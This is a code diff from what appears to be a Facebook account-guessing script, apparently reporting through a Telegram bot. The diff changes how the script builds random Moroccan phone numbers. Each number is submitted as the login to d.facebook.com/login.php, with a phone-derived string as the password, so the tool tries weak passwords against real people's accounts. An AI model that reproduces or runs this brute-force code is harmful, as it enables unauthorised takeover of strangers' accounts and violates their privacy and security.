@@ -122,9 +122,9 @@ else:
             id_msg = start_msg['result']['message_id']           
             while True:
                 user = '0123456789'
-                us = str(''.join((random.choice(user) for i in range(7))))                
-                felling = '+21266' + us
-                fellings = '066' + us         
+                us = str(''.join((random.choice(user) for i in range(8))))                
+                felling = '+2126' + us
+                fellings = '06' + us         
              
                 link = 'https://d.facebook.com/login.php'
                 data = {'email':felling,  'pass':fellings}
